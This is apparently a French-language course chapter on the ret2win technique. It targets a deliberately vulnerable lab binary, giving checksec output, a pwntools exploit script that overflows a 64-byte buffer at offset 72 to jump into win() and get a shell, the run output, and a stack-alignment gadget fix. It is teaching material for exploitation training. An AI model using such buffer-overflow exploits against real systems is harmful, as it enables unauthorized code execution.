# 06 — Ret2win

[← Module](README.md)

## Objectif

Détourner l'exécution vers une fonction déjà présente dans le binaire. C'est l'exploit le plus
simple qui existe, et le socle de tous les suivants : une adresse, un offset, un saut.

## La cible

On reprend `ret2win.c` du chapitre 05 : un tampon de 64 octets lu avec `read(0, buf, 200)`, et une
fonction `win()` jamais appelée.

```bash
pwn checksec ./ret2win
```

```text
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

`No PIE` rend `win()` appelable par son adresse absolue. `No canary` autorise le débordement.
`NX enabled` interdit le shellcode, mais on n'en a pas besoin.

## Les adresses

```python
from pwn import *

context.binary = elf = ELF("./ret2win", checksec=False)
print("win :", hex(elf.symbols["win"]))
print("vuln:", hex(elf.symbols["vuln"]))
```

```text
win : 0x401156
vuln: 0x40118f
```

## L'exploit

```python
from pwn import *

context.binary = elf = ELF("./ret2win", checksec=False)
context.log_level = "error"

OFFSET = 72
payload  = b"A" * OFFSET
payload += p64(elf.symbols["win"])

io = process("./ret2win")
io.recvuntil(b"Entree :\n")
io.send(payload)
io.sendline(b"echo PWNED; id")
print(io.recvall(timeout=3).decode(errors="replace").strip())
```

```text
Entree :
Bravo, tu as detourne l'execution !
PWNED
uid=10001(openhands) gid=10001(openhands) groups=10001(openhands),27(sudo)
```

La ligne `PWNED` vient du shell ouvert par `win()` : la preuve n'est pas le message, c'est la
commande exécutée.

## Variante avec ROP()

pwntools peut construire la chaîne à partir du nom de la fonction :

```python
rop = ROP(elf)
rop.win()
payload = b"A" * OFFSET + rop.chain()
```

`ROP(elf)` ne sert à rien ici — `win()` ne prend pas d'argument — mais il devient indispensable dès
qu'il faut placer une valeur dans `rdi`, comme au chapitre 07.

## Pourquoi ça marche, en trois instructions

1. `read` écrit 72 octets : 64 dans `buf`, 8 dans le `rbp` sauvegardé, 8 dans l'adresse de retour.
2. `vuln` exécute `leave` : `rsp = rbp`, puis `pop rbp` — le `rbp` écrasé part dans le registre.
3. `ret` dépile l'adresse de retour, qui vaut maintenant `0x401156` : l'exécution continue dans
   `win()`, jamais dans `main()`.

## Le piège de l'alignement

Sur un binaire compilé pour x86-64, `win()` peut contenir un appel à `puts` ou `printf`, qui
utilisent des instructions `movaps` exigeant une pile alignée sur 16 octets. Quand on saute
directement à une fonction par un `ret`, l'alignement est décalé de 8 : le programme plante dans
la libc, avec un `SIGSEGV` incompréhensible.

La correction tient en un gadget :

```python
ret = next(elf.search(asm("ret")))
payload = b"A" * OFFSET + p64(ret) + p64(elf.symbols["win"])
```

Le `ret` supplémentaire consomme 8 octets de pile et rétablit l'alignement. Règle pratique : si
l'exploit plante **dans** la fonction cible et non au `ret`, ajouter ce gadget.

Sur ce lab, `win()` commence par `puts` puis `execl` et fonctionne sans le gadget ; ce n'est pas une
garantie générale.

## Retrouver le gadget

```python
from pwn import *

context.binary = elf = ELF("./ret2win", checksec=False)
print(hex(next(elf.search(asm("ret")))))
```

Ou en ligne de commande :

```bash
ROPgadget --binary ./ret2win --only "ret"
```

## Pièges

| Symptôme | Cause |
| --- | --- |
| `SIGSEGV` dans `puts`/`printf` | alignement de pile : insérer un `ret` |
| Rien ne se passe, retour propre | offset trop court : l'adresse de retour n'est pas atteinte |
| `Bravo` affiché mais pas de shell | `execl` a échoué : le binaire n'a pas trouvé `/bin/sh` |
| Adresse de `win` différente à chaque run | PIE actif : il faut une fuite |

## À retenir

- Ret2win = offset + adresse d'une fonction existante.
- `No PIE` fournit l'adresse ; `No canary` autorise l'écrasement.
- L'alignement de pile casse une exploitation sur deux : un `ret` en plus le corrige.
- La preuve d'un exploit, c'est une commande exécutée, pas un message affiché.
